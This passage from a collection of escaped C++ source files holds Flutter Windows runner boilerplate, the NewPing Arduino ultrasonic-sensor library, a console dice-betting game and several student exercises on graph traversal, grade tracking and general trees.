can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "// ---------------------------------------------------------------------------\n// Created by Tim Eckel - eckel.tim@gmail.com\n//\n// See NewPing.h for license, purpose, syntax, version history, links, etc.\n// ---------------------------------------------------------------------------\n\n#include \"NewPing.h\"\n\n\n// ---------------------------------------------------------------------------\n// NewPing constructor\n// ---------------------------------------------------------------------------\n\nNewPing::NewPing(uint8_t trigger_pin, uint8_t echo_pin, unsigned int max_cm_distance) {\n#if DO_BITWISE == true\n\t_triggerBit = digitalPinToBitMask(trigger_pin); // Get the port register bitmask for the trigger pin.\n\t_echoBit = digitalPinToBitMask(echo_pin);       // Get the port register bitmask for the echo pin.\n\n\t_triggerOutput = portOutputRegister(digitalPinToPort(trigger_pin)); // Get the output port register for the trigger pin.\n\t_echoInput = portInputRegister(digitalPinToPort(echo_pin));         // Get the input port register for the echo pin.\n\n\t_triggerMode = (uint8_t *) portModeRegister(digitalPinToPort(trigger_pin)); // Get the port mode register for the trigger pin.\n#else\n\t_triggerPin = trigger_pin;\n\t_echoPin = echo_pin;\n#endif\n\t_one_pin_mode = (trigger_pin == echo_pin); // Automatic one pin mode detection per sensor.\n\n\tset_max_distance(max_cm_distance); // Call function to set the max sensor distance.\n\n#if (defined(__arm__) && (defined(TEENSYDUINO) || defined(PARTICLE))) || defined(ARDUINO_AVR_YUN) || DO_BITWISE != true\n\tpinMode(echo_pin, INPUT);     // Set echo pin to input (on Teensy 3.x (ARM), pins default to disabled, at least one pinMode() is needed for GPIO mode).\n\tpinMode(trigger_pin, OUTPUT); // Set trigger pin to output (on Teensy 3.x (ARM), pins default to disabled, at least one pinMode() is needed for GPIO mode).\n#endif\n\n#if DO_BITWISE == true\n\t*_triggerMode |= _triggerBit;    // Set trigger pin to output.\n\t*_triggerOutput &= ~_triggerBit; // Trigger pin should already be low, but set to low to make sure.\n#else\n\tdigitalWrite(_triggerPin, LOW);  // Trigger pin should already be low, but set to low to make sure.\n#endif\n}\n\n\n// ---------------------------------------------------------------------------\n// Standard ping methods\n// ---------------------------------------------------------------------------\n\nunsigned int NewPing::ping(unsigned int max_cm_distance) {\n\tif (max_cm_distance > 0) set_max_distance(max_cm_distance); // Call function to set a new max sensor distance.\n\n\tif (!ping_trigger()) return NO_ECHO; // Trigger a ping, if it returns false, return NO_ECHO to the calling function.\n\n#if URM37_ENABLED == true\n\t#if DO_BITWISE == true\n\t\twhile (!(*_echoInput & _echoBit)) // Wait for the ping echo.\n\t#else\n\t\twhile (!digitalRead(_echoPin))    // Wait for the ping echo.\n\t#endif\n\t\t\tif (micros() > _max_time) return NO_ECHO; // Stop the loop and return NO_ECHO (false) if we're beyond the set maximum distance.\n#else\n\t#if DO_BITWISE == true\n\t\twhile (*_echoInput & _echoBit)    // Wait for the ping echo.\n\t#else\n\t\twhile (digitalRead(_echoPin))     // Wait for the ping echo.\n\t#endif\n\t\t\tif (micros() > _max_time) return NO_ECHO; // Stop the loop and return NO_ECHO (false) if we're beyond the set maximum distance.\n#endif\n\n\treturn (micros() - (_max_time - _maxEchoTime) - PING_OVERHEAD); // Calculate ping time, include overhead.\n}\n\n\nunsigned long NewPing::ping_cm(unsigned int max_cm_distance) {\n\tunsigned long echoTime = NewPing::ping(max_cm_distance); // Calls the ping method and returns with the ping echo distance in uS.\n#if ROUNDING_ENABLED == false\n\treturn (echoTime / US_ROUNDTRIP_CM);              // Call the ping method and returns the distance in centimeters (no rounding).\n#else\n\treturn NewPingConvert(echoTime, US_ROUNDTRIP_CM); // Convert uS to centimeters.\n#endif\n}\n\n\nunsigned long NewPing::ping_in(unsigned int max_cm_distance) {\n\tunsigned long echoTime = NewPing::ping(max_cm_distance); // Calls the ping method and returns with the ping echo distance in uS.\n#if ROUNDING_ENABLED == false\n\treturn (echoTime / US_ROUNDTRIP_IN);              // Call the ping method and returns the distance in inches (no rounding).\n#else\n\treturn NewPingConvert(echoTime, US_ROUNDTRIP_IN); // Convert uS to inches.\n#endif\n}\n\n\nunsigned long NewPing::ping_median(uint8_t it, unsigned int max_cm_distance) {\n\tunsigned int uS[it], last;\n\tuint8_t j, i = 0;\n\tunsigned long t;\n\tuS[0] = NO_ECHO;\n\n\tif (max_cm_distance > 0) set_max_distance(max_cm_distance); // Call function to set a new max sensor distance.\n\n\twhile (i < it) {\n\t\tt = micros();          // Start ping timestamp.\n\t\tlast = ping();         // Send ping.\n\n\t\tif (last != NO_ECHO) { // Ping in range, include as part of median.\n\t\t\tif (i > 0) {       // Don't start sort till second ping.\n\t\t\t\tfor (j = i; j > 0 && uS[j - 1] < last; j--) // Insertion sort loop.\n\t\t\t\t\tuS[j] = uS[j - 1];                      // Shift ping array to correct position for sort insertion.\n\t\t\t} else j = 0;      // First ping is s",
    "#include <iostream>\r\n#include <string>\r\n#include <fstream>\r\n#include <ctime>\r\nusing namespace std;\r\n\r\nvoid drawLine( int n, char symbol);\r\nvoid rules();\r\nint main()\r\n{\r\n    ofstream outdata;\r\n    outdata.open(\"Record.txt\",ios::app);\r\n    string playerName;\r\n    float amount;\r\n    float bettingAmount;\r\n    float guess;\r\n    float dice;\r\n    char choice;\r\n\r\n    srand(time(0));\r\n    system(\"color 6\");\r\n\r\n    drawLine(80,'_');\r\n    cout<<\"\\n   *****      *        *********   *********  **     **    ********     \";\r\n    cout<<\"\\n **          *  *      **             ***     ** *   **   **      **    \";\r\n    cout<<\"\\n**          *    *     *********      ***     **  *  **   **      **    \";\r\n    cout<<\"\\n **        ********           **      ***     **   * **   **      **    \";\r\n    cout<<\"\\n   *****  *        *   *********   *********  **     **    ********   \\n\";\r\n    drawLine(80,'_');\r\n\r\n    cout << \"\\n\\nEnter Your Name : \";\r\n    getline(cin, playerName);\r\n    outdata<<playerName<<\"\\t\\t\";\r\n\r\n    cout << \"\\n\\nEnter Deposit amount to play game : $\";\r\n    cin >> amount;\r\n    outdata<<\"Balance is \"<<amount<<\"\\t\\t\";\r\n\r\n    do\r\n    {\r\n        system(\"cls\");\r\n        rules();\r\n        cout << \"\\n\\nYour current balance is $ \" << amount << \"\\n\";\r\n\r\n\r\n        do\r\n        {\r\n            cout <<playerName<<\", enter money to bet : $\";\r\n            cin >> bettingAmount;\r\n            outdata<<\"\\n  Bet Amount is: \"<<bettingAmount;\r\n            if(bettingAmount > amount)\r\n                cout << \"Your betting amount is more than your current balance\\n\"\r\n                       <<\"\\nRe-enter data\\n \";\r\n        }while(bettingAmount > amount);\r\n\r\n\r\n        do\r\n        {\r\n            cout << \"Guess your number to bet between 1 to 10 :\";\r\n            cin >> guess;\r\n            if(guess <= 0 || guess > 10)\r\n                cout << \"Please check the number!! should be between 1 to 10\\n\"\r\n                    <<\"\\nRe-enter data\\n \";\r\n        }while(guess <= 0 || guess > 10);\r\n\r\n        dice = rand()%10 + 1;\r\n        if(dice == guess)\r\n        {\r\n            cout << \"\\n\\nGood Luck!! You won Rs.\" << bettingAmount * 10;\r\n            amount = amount + bettingAmount * 10 ;\r\n            outdata<<\"\\n  Good Luck!! You won Rs.\" <<bettingAmount * 10;\r\n            outdata<<\"\\n-->NOW YOUR NEW BALANCE IS: \" <<amount ;\r\n        }\r\n        else\r\n        {\r\n            cout << \"Bad Luck this time !! You lost $ \"<< bettingAmount <<\"\\n\";\r\n            amount = amount - bettingAmount;\r\n            outdata<<\"\\n  Bad Luck this time !! You lost $ \" <<bettingAmount;\r\n            outdata<<\"\\n-->NOW YOUR NEW BALANCE IS: \" <<amount;\r\n        }\r\n\r\n        cout << \"\\nThe winning number was : \" << dice <<\"\\n\";\r\n        cout << \"\\n\"<<playerName<<\", You have $ \" << amount << \"\\n\";\r\n        if(amount == 0)\r\n        {\r\n            cout << \"You have no money to play \";\r\n            break;\r\n        }\r\n        cout << \"\\n\\n-->Do you want to play again (y/n)? \";\r\n        cin >> choice;\r\n    }while(choice =='Y'|| choice=='y');\r\n\r\n    cout << \"\\n\\n\\n\";\r\n    drawLine(70,'=');\r\n    cout << \"\\n\\nThanks for playing game. Your balance amount is $ \" << amount << \"\\n\\n\";\r\n    outdata << \"\\n\\nThanks for playing game. Your balance amount is $ \" << amount<< \"\\n\\n\";\r\n    drawLine(70,'=');\r\n\r\n    return 0;\r\n}\r\n\r\nvoid drawLine(int n, char symbol)\r\n{\r\n    for(int i=0; i<n; i++)\r\n        cout << symbol;\r\n    cout << \"\\n\" ;\r\n}\r\n\r\nvoid rules()\r\n{\r\n    system(\"cls\");\r\n    cout << \"\\n\\n\";\r\n    drawLine(80,'-');\r\n    cout << \"\\t\\tRULES OF THE GAME\\n\";\r\n    drawLine(80,'-');\r\n    cout << \"\\t1. Choose any number between 1 to 10\\n\";\r\n    cout << \"\\t2. If you win you will get 10 times of money you bet\\n\";\r\n    cout << \"\\t3. If you bet on wrong number you will lose your betting amount\\n\\n\";\r\n    drawLine(80,'-');\r\n\r\n\r\n}\r\n",
    "/*---------------------------------------------------\r\nPr no : 06\r\nTitle : Represent a given graph using adjacency matrix/list to perform DFS and using adjacency list to perform BFS. Use the map of the area around the college as the graph. Identify  the prominent land marks as nodes and perform DFS and BFS on that\r\n-----------------------------------------------------*/\r\n\r\n#include<iostream>\r\nusing namespace std;\r\nclass graph\r\n{\r\n       int a[10][10],vcnt,Rcnt;\r\n       int v[20];\r\n       public:\r\n              graph()\r\n              {\r\n                     Rcnt = 0;\r\n                     vcnt=0;\r\n              }\r\n              void read_adjacency();\r\n              void display_adjacency();\r\n              void BFS();\r\n              void DFS();\r\n              int search(int);\r\n           \r\n};\r\nvoid graph::read_adjacency()\r\n{\r\n       cout<<\"Enter vertex count :\";\r\n       cin>>vcnt;\r\n       for(int i=1;i<=vcnt;i++)\r\n       {\r\n              for(int j=1;j<=vcnt;j++)\r\n              {\r\n                     cout<<\"Enter edge \"<<i<<\"to\"<<j<<\":\";\r\n                     cin>>a[i][j];\r\n              }\r\n       }\r\n}\r\nvoid graph::display_adjacency()\r\n{\r\n       for(int i=1;i<=vcnt;i++)\r\n       {\r\n              for(int j=1;j<=vcnt;j++)\r\n              {\r\n                     cout<<a[i][j]<<\"  \";\r\n              }\r\n              cout<<\"\\n\";\r\n       }\r\n}\r\n\r\nclass Queue\r\n{\r\n       int a[20],f,r;\r\n       public:\r\n       Queue()\r\n       {\r\n              f=0;\r\n              r=0;\r\n       }\r\n       void insert(int key);\r\n       int Delete();\r\n };\r\n\r\n void Queue::insert(int key)\r\n {\r\n       if(r!=20)\r\n       {\r\n              a[r++]=key;\r\n       }\r\n       else\r\n       {\r\n              cout<<\"Queue is full \";\r\n       }\r\n }\r\n\r\n int Queue::Delete()\r\n {\r\n       if(f!=r)\r\n       {\r\n              return (a[f++]);\r\n       }\r\n       else\r\n       {\r\n              cout<<\"Queue is Empty \";\r\n       }\r\n}\r\n \r\n class stack\r\n {\r\n       int a[20],top;\r\n       public:\r\n              stack()\r\n              {\r\n               top=-1;\r\n              }\r\n              void push(int key);\r\n              int pop();\r\n};\r\nvoid stack::push(int key)\r\n{\r\n       if(top!=20)\r\n       {\r\n              a[++top]=key;\r\n       }\r\n       else\r\n       {\r\n              cout<<\"Stack is full \";\r\n       }\r\n}\r\nint stack::pop()\r\n{\r\n       if(top!=-1)\r\n       {\r\n              return(a[top--]);\r\n       }\r\n       else\r\n       {\r\n              cout<<\"Stack is Empty\";\r\n       }\r\n}\r\n\r\nint graph::search(int key)\r\n{\r\n       int i;\r\n\r\n       for(i = 0; i<Rcnt; i++)\r\n       {\r\n              if(v[i] == key)\r\n              {\r\n                     return(1);\r\n              }\r\n       }\r\n       if(i == Rcnt )\r\n       {\r\n              return(0);\r\n       }\r\n}       \r\n\r\n\r\n\r\nvoid graph::BFS()\r\n{\r\n       int sv,curr;\r\n\r\n       cout<<\"Enter starting vertex \";\r\n       cin>>sv;\r\n       v[Rcnt++]=sv;\r\n       \r\n       Queue q;\r\n       q.insert(sv);\r\n\r\n       for(int i=1; i<=vcnt; i++)\r\n       {\r\n              curr=q.Delete();\r\n\r\n              for(int c=1;c<=vcnt;c++)\r\n              {\r\n                     if(a[curr][c]==1) \r\n                     {\r\n                  \tq.insert(c);\r\n                     \tif(search(c)==0)\r\n                     \t{\t               \r\n                            v[Rcnt++]=c;\r\n                       \t}\r\n                     }\r\n              }\r\n       }\r\n\r\n       cout<<\"BFS=\";\r\n       for(int i=0;i<Rcnt;i++)\r\n       {\r\n       \t\tcout<<\"   \"<<v[i];\r\n       }\r\n\r\n}\r\n       \r\n\r\nvoid graph::DFS()\r\n{\r\n       int sv,curr;\r\n\r\n       cout<<\"Enter starting vertex \";\r\n       cin>>sv;\r\n       v[Rcnt++]=sv;\r\n       \r\n       stack s;\r\n       s.push(sv);\r\n\r\n       for(int i=1; i<=vcnt; i++)\r\n       {\r\n              curr=s.pop();\r\n\r\n              for(int c=1;c<=vcnt;c++)\r\n              {\r\n                     if(a[curr][c]==1) \r\n                     {\r\n                  \ts.push(c);\r\n                     \tif(search(c)==0)\r\n                     \t{\t               \r\n                            v[Rcnt++]=c;\r\n                       \t}\r\n                     }\r\n              }\r\n       }\r\n\r\n       cout<<\"\\nDFS=\";\r\n       for(int i=0;i<Rcnt;i++)\r\n       {\r\n       \t\tcout<<\"   \"<<v[i];\r\n       }\r\n}\r\n       \r\n\r\nint main()\r\n{\r\n       int choice,key;\r\n       graph obj;\r\n       Queue q;\r\n       stack s;\r\n       obj.read_adjacency();\r\n       obj.display_adjacency();\r\n       do\r\n       {\r\n\t       cout<<\"\\nMenu\\n1.BFS\\n2.DFS\\n Enter choice \";\r\n\t       cin>>choice;\r\n\t       switch(choice)\r\n\t       {\r\n\t\t      case 1:\r\n\t\t                    obj.BFS();\r\n\t\t       break;                           \r\n\t\t       case 2:\r\n\t\t                    obj.DFS();\r\n\t\t       break;                              \r\n\t       }\r\n       }while(choice!=3);\r\n       return 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"webservice\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <iomanip>\r\n\r\nstruct Student {\r\n    std::string name;\r\n    std::vector<double> grades;\r\n};\r\n\r\nint main() {\r\n    std::vector<Student> students;\r\n    char choice;\r\n\r\n    do {\r\n        std::cout << \"1. Add Student\\n\";\r\n        std::cout << \"2. Add Grade for Student\\n\";\r\n        std::cout << \"3. Calculate Average Grade\\n\";\r\n        std::cout << \"4. View Students and Grades\\n\";\r\n        std::cout << \"5. Quit\\n\";\r\n        std::cout << \"Enter your choice: \";\r\n        std::cin >> choice;\r\n\r\n        switch(choice) {\r\n            case '1':\r\n                {\r\n                    Student newStudent;\r\n                    std::cout << \"Enter student name: \";\r\n                    std::cin >> newStudent.name;\r\n                    students.push_back(newStudent);\r\n                }\r\n                break;\r\n            case '2':\r\n                {\r\n                    std::string studentName;\r\n                    double grade;\r\n                    std::cout << \"Enter student name: \";\r\n                    std::cin >> studentName;\r\n                    bool found = false;\r\n                    for (auto& student : students) {\r\n                        if (student.name == studentName) {\r\n                            std::cout << \"Enter grade for \" << studentName << \": \";\r\n                            std::cin >> grade;\r\n                            student.grades.push_back(grade);\r\n                            found = true;\r\n                            break;\r\n                        }\r\n                    }\r\n                    if (!found) {\r\n                        std::cout << \"Student not found!\\n\";\r\n                    }\r\n                }\r\n                break;\r\n            case '3':\r\n                {\r\n                    std::string studentName;\r\n                    std::cout << \"Enter student name: \";\r\n                    std::cin >> studentName;\r\n                    bool found = false;\r\n                    for (const auto& student : students) {\r\n                        if (student.name == studentName) {\r\n                            double total = 0;\r\n                            for (const auto& grade : student.grades) {\r\n                                total += grade;\r\n                            }\r\n                            double average = total / student.grades.size();\r\n                            std::cout << \"Average grade for \" << studentName << \": \" << std::fixed << std::setprecision(2) << average << std::endl;\r\n                            found = true;\r\n                            break;\r\n                        }\r\n                    }\r\n                    if (!found) {\r\n                        std::cout << \"Student not found!\\n\";\r\n                    }\r\n                }\r\n                break;\r\n            case '4':\r\n                {\r\n                    std::cout << \"Students and Grades:\\n\";\r\n                    for (const auto& student : students) {\r\n                        std::cout << \"Student: \" << student.name << \", Grades: \";\r\n                        for (const auto& grade : student.grades) {\r\n                            std::cout << grade << \" \";\r\n                        }\r\n                        std::cout << std::endl;\r\n                    }\r\n                }\r\n                break;\r\n            case '5':\r\n                std::cout << \"Exiting program...\";\r\n                break;\r\n            default:\r\n                std::cout << \"Invalid choice!\\n\";\r\n                break;\r\n        }\r\n    } while (choice != '5');\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "/*\r\nPractical No: 03 - A C++ Program to implement General Tree\r\n Construct a Tree of Book consist of Chapters,\r\nChapters consist of Sections\r\n and Sections consist of Subsections.\r\n*/\r\n \r\n#include <iostream>\r\nusing namespace std;\r\n \r\nstruct Node\r\n{\r\n char name[25];\r\n struct Node *link1;\r\n struct Node *link2;\r\n struct Node *link3;\r\n}*Root, *Ch;\r\n\r\nvoid create_Tree()\r\n{\r\n struct Node *temp;\r\n\r\n temp = new struct Node; \r\n\r\n cout<<\"\\n\\n Enter Book Name: \"; \r\n cin>>temp->name;\r\n temp->link1 = NULL;\r\n temp->link2 = NULL;\r\n temp->link3 = NULL;\r\n\r\n if(Root == NULL) \r\n Root = temp;\r\n}\r\n \r\nvoid display()\r\n{\r\n if(Root)\r\n cout<<\"\\n\\n Book Name: \"<<Root->name;\r\n\r\n Ch = Root->link1; \r\n if(Ch)\r\n {\r\n cout<<\"\\n\\n Chapter 01: \"<<Ch->name;\r\n if(Ch->link1)\r\n cout<<\"\\n\\t Section 01: \"<<Ch->link1->name;\r\n if(Ch->link2)\r\n cout<<\"\\n\\t Section 02: \"<<Ch->link2->name;\r\n if(Ch->link3)\r\n cout<<\"\\n\\t Section 03: \"<<Ch->link3->name;\r\n }\r\n\r\n Ch = Root->link2; \r\n if(Ch)\r\n {\r\n cout<<\"\\n\\n Chapter 02: \"<<Ch->name;\r\n if(Ch->link1)\r\n cout<<\"\\n\\t Section 01: \"<<Ch->link1->name;\r\n if(Ch->link2)\r\n cout<<\"\\n\\t Section 02: \"<<Ch->link2->name;\r\n if(Ch->link3)\r\n cout<<\"\\n\\t Section 03: \"<<Ch->link3->name;\r\n }\r\n\r\n Ch = Root->link3; \r\n if(Ch)\r\n {\r\n cout<<\"\\n\\n Chapter 03: \"<<Ch->name;\r\n if(Ch->link1)\r\n cout<<\"\\n\\t Section 01: \"<<Ch->link1->name;\r\n if(Ch->link2)\r\n cout<<\"\\n\\t Section 02: \"<<Ch->link2->name;\r\n if(Ch->link3)\r\n cout<<\"\\n\\t Section 03: \"<<Ch->link3->name;\r\n }\r\n}\r\n \r\nvoid insert_Chapter()\r\n{\r\n struct Node *temp;\r\n\r\n temp = new struct Node; \r\n\r\n cout<<\"\\n\\t Enter Chapter Name: \";\r\n cin>>temp->name;\r\n temp->link1 = NULL;\r\n temp->link2 = NULL;\r\n temp->link3 = NULL;\r\n\r\n if(Root->link1 == NULL) \r\n Root->link1 = temp;\r\n else if(Root->link2 == NULL)\r\n Root->link2 = temp;\r\n else if(Root->link3 == NULL)\r\n Root->link3 = temp;\r\n else\r\n cout<<\"\\n ...No More Chapters can be added...!!!\";\r\n}\r\n\r\nvoid insert_Sec()\r\n{\r\n struct Node *temp;\r\n\r\n temp = new struct Node; \r\n\r\n cout<<\"\\n\\t Enter Section Name: \"; \r\n cin>>temp->name;\r\n temp->link1 = NULL;\r\n temp->link2 = NULL;\r\n temp->link3 = NULL;\r\n\r\n\r\n if(Ch->link1 == NULL) \r\n Ch->link1 = temp;\r\n else if(Ch->link2 == NULL)\r\n Ch->link2 = temp;\r\n else if(Ch->link3 == NULL)\r\n Ch->link3 = temp;\r\n else\r\n cout<<\"\\n ...No More Sections can be added...!!!\";\r\n}\r\n \r\nvoid insert_Section()\r\n{\r\n int chap;\r\n\r\n cout<<\"\\n\\n Enter Sections of Chapter(1/2/3): \";\r\n cin>>chap;\r\n\r\n switch(chap)\r\n {\r\n case 1: Ch = Root->link1;\r\n insert_Sec();\r\n insert_Sec();\r\n break;\r\n case 2: Ch = Root->link2;\r\n insert_Sec();\r\n insert_Sec();\r\n break;\r\n case 3: Ch = Root->link3;\r\n insert_Sec();\r\n insert_Sec();\r\n break;\r\n }\r\n}\r\n \r\nint main()\r\n{\r\n cout<<\"\\n -------- A C++ Program to implement General Tree--------\";\r\n Root = NULL;\r\n\r\n create_Tree();\r\n\r\n insert_Chapter();\r\n insert_Chapter();\r\n insert_Chapter();\r\n\r\n insert_Section();\r\n insert_Section();\r\n insert_Section();\r\n\r\n display();\r\n\r\n return 0;\r\n}\r\n/*\r\n-------- A C++ Program to implement General Tree--------\r\n\r\n Enter Book Name: Data_Structures\r\n\r\n Enter Chapter Name: Ch01_Array\r\n Enter Chapter Name: Ch02_Stack\r\n Enter Chapter Name: Ch03_Queue\r\n\r\n Enter Sections of Chapter(1/2/3): 1\r\n Enter Section Name: 1D_Array\r\n Enter Section Name: 2D_Array\r\n\r\n 